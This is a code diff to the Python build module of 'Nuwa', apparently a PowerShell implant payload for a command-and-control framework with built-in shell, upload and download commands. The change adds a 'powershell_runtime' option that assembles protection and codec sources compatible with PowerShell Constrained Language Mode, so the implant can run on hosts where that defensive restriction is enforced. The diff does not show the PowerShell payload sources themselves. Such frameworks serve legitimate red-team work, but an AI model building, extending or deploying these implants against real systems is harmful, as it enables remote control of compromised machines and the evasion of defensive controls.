@@ -105,6 +105,8 @@ DISCORD_PROFILE_ROOT = PROFILE_ROOT / "discord"
 DISCORD_ENVELOPE_CODEC_ROOT = DISCORD_PROFILE_ROOT / "envelope_codecs"
 PROTECTION_ROOT = AGENT_CODE_ROOT / "protection"
 PROTECTION_PROFILE_ROOT = PROTECTION_ROOT / "profiles"
+CLM_PROTECTION_ROOT = PROTECTION_ROOT / "clm"
+CLM_PROTECTION_PROFILE_ROOT = CLM_PROTECTION_ROOT / "profiles"
 STAGING_ROOT = AGENT_CODE_ROOT / "staging"
 DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
 POWERSHELL_CODEC_PROFILES = tuple(
@@ -129,6 +131,16 @@ PROTECTED_PROFILES = (
 )
 PROTECTION_CHOICES = (PROTECTION_NONE, *PROTECTED_PROFILES)
 LEGACY_UNVERSIONED_PROTECTION = "aes256_hmac"
+POWERSHELL_RUNTIME_FULL = "full-language"
+POWERSHELL_RUNTIME_CONSTRAINED = "constrained-language"
+POWERSHELL_RUNTIME_CHOICES = (
+    POWERSHELL_RUNTIME_FULL,
+    POWERSHELL_RUNTIME_CONSTRAINED,
+)
+CLM_STAGING_ERROR = (
+    "Nuwa constrained-language runtime does not support RSA staging; disable "
+    "encrypted_exchange_check or select full-language"
+)
 
 
 @dataclass(frozen=True)
@@ -251,6 +263,46 @@ def _resolve_protection_selection(value: Any) -> ProtectionSelection:
     if decoded_enc_key != decoded_dec_key:
         raise ValueError("Nuwa protection encryption and decryption keys must match")
     return ProtectionSelection(profile=profile, key=decoded_enc_key)
+
+
+def _coerce_powershell_runtime(value: Any) -> str:
+    """Return the canonical build-time PowerShell implementation selection."""
+    if isinstance(value, str):
+        normalized = value.strip().lower()
+        if normalized in POWERSHELL_RUNTIME_CHOICES:
+            return normalized
+    raise ValueError(
+        "powershell_runtime must be 'full-language' or 'constrained-language'"
+    )
+
+
+def _protection_source_paths(
+    protection_profile: str,
+    powershell_runtime: str,
+) -> tuple[pathlib.Path, ...]:
+    """Return only the ordered PowerShell source fragments for one backend."""
+    runtime = _coerce_powershell_runtime(powershell_runtime)
+    if protection_profile not in PROTECTED_PROFILES:
+        raise ValueError(f"Unsupported protected profile '{protection_profile}'")
+
+    if runtime == POWERSHELL_RUNTIME_FULL:
+        paths = (PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1",)
+    else:
+        paths_list = [CLM_PROTECTION_ROOT / "common.ps1"]
+        if protection_profile in {
+            PROTECTION_HMAC_SHA256_V1,
+            PROTECTION_AES256_HMAC_V1,
+        }:
+            paths_list.append(CLM_PROTECTION_ROOT / "sha256.ps1")
+        if protection_profile == PROTECTION_AES256_HMAC_V1:
+            paths_list.append(CLM_PROTECTION_ROOT / "aes256.ps1")
+        paths_list.append(CLM_PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1")
+        paths = tuple(paths_list)
+
+    for path in paths:
+        if not path.is_file():
+            raise ValueError(f"Missing PowerShell protection source '{path.name}'")
+    return paths
 
 
 def _coerce_require_https(value: Any) -> bool:
@@ -587,6 +639,7 @@ def render_protected_payload_source(
     protection_profile: str,
     protection_key: bytes,
     discord_envelope_codec: str = "decimal",
+    powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
     staging_enabled: bool = False,
 ) -> str:
     c2_profile_name = str(c2_profile_name or "").strip().lower()
@@ -607,6 +660,7 @@ def render_protected_payload_source(
     protection_profile = str(protection_profile or "").strip().lower()
     if protection_profile not in PROTECTED_PROFILES:
         raise ValueError(f"Unsupported protected profile '{protection_profile}'")
+    powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
     if not isinstance(protection_key, bytes) or len(protection_key) != 32:
         raise ValueError("Protected payload rendering requires one 32-byte key")
     if not isinstance(staging_enabled, bool):
@@ -615,9 +669,12 @@ def render_protected_payload_source(
         raise ValueError(
             "RSA staging requires the nuwa_aes256_hmac_v1 protection profile"
         )
-    profile_path = PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1"
-    if not profile_path.is_file():
-        raise ValueError(f"Missing PowerShell protection profile '{protection_profile}'")
+    if staging_enabled and powershell_runtime == POWERSHELL_RUNTIME_CONSTRAINED:
+        raise ValueError(CLM_STAGING_ERROR)
+    protection_source_paths = _protection_source_paths(
+        protection_profile,
+        powershell_runtime,
+    )
 
     framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
     if framing_mode == "raw":
@@ -663,7 +720,7 @@ def render_protected_payload_source(
                 PROFILE_ROOT / c2_profile_name / "framing" / framing_mode / "functions.ps1"
             ),
             _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
-            _read_text(profile_path),
+            *(_read_text(path) for path in protection_source_paths),
             _read_text(PROTECTION_ROOT / "protected_codec_dispatch.ps1"),
         ]
     )
@@ -779,12 +836,22 @@ class Nuwa(PayloadType):
             default_value=False,
             description="Reject HTTP callback URLs that do not use HTTPS",
         ),
+        BuildParameter(
+            name="powershell_runtime",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=list(POWERSHELL_RUNTIME_CHOICES),
+            default_value=POWERSHELL_RUNTIME_FULL,
+            description="Select optimized Full Language or CLM-compatible PowerShell runtime source",
+        ),
     ]
 
     async def build(self) -> BuildResponse:
         response = BuildResponse(status=BuildStatus.Success)
         try:
             selected_c2 = _resolve_selected_c2_profile(self.c2info)
+            powershell_runtime = _coerce_powershell_runtime(
+                self.get_parameter("powershell_runtime")
+            )
             protection = _resolve_protection_selection(
                 selected_c2.parameters.get("AESPSK")
             )
@@ -823,6 +890,11 @@ class Nuwa(PayloadType):
                 exchange_enabled
                 and protection.profile == PROTECTION_AES256_HMAC_V1
             )
+            if (
+                staging_enabled
+                and powershell_runtime == POWERSHELL_RUNTIME_CONSTRAINED
+            ):
+                raise ValueError(CLM_STAGING_ERROR)
 
             render_arguments = {
                 "payload_uuid": self.uuid,
@@ -844,21 +916,32 @@ class Nuwa(PayloadType):
                     **render_arguments,
                     protection_profile=protection.profile,
                     protection_key=protection.key,
+                    powershell_runtime=powershell_runtime,
                     staging_enabled=staging_enabled,
                 )
             response.payload = payload_source.encode("utf-8")
             if protection.profile == PROTECTION_NONE:
-                response.build_message = "Successfully built Nuwa PowerShell payload"
+                response.build_message = (
+                    "Successfully built Nuwa PowerShell payload using "
+                    f"{powershell_runtime} runtime source"
+                )
             elif staging_enabled:
                 response.build_message = (
                     "Successfully built Nuwa PowerShell payload with staged RSA "
-                    "session keys; protected profiles require Windows PowerShell "
-                    "Full Language Mode"
+                    "session keys using full-language runtime source; protected "
+                    "staging requires Windows PowerShell Full Language Mode"
+                )
+            elif powershell_runtime == POWERSHELL_RUNTIME_CONSTRAINED:
+                response.build_message = (
+                    "Successfully built Nuwa PowerShell payload with "
+                    "constrained-language runtime source and CLM-compatible "
+                    "static protection"
                 )
             else:
                 response.build_message = (
-                    "Successfully built Nuwa PowerShell payload; protected profiles "
-                    "require Windows PowerShell Full Language Mode"
+                    "Successfully built Nuwa PowerShell payload using full-language "
+                    "runtime source; protected profiles require Windows PowerShell "
+                    "Full Language Mode"
                 )
         except Exception as exc:  # pragma: no cover - exercised in integration
             response.set_status(BuildStatus.Error)
@@ -881,9 +964,14 @@ __all__ = [
     "PROTECTION_HMAC_SHA256_V1",
     "PROTECTION_NONE",
     "PROTECTION_XOR_V1",
+    "POWERSHELL_RUNTIME_CHOICES",
+    "POWERSHELL_RUNTIME_CONSTRAINED",
+    "POWERSHELL_RUNTIME_FULL",
     "PayloadType",
     "ProtectionSelection",
     "SupportedOS",
+    "_coerce_powershell_runtime",
+    "_protection_source_paths",
     "render_protected_payload_source",
     "render_payload_source",
 ]
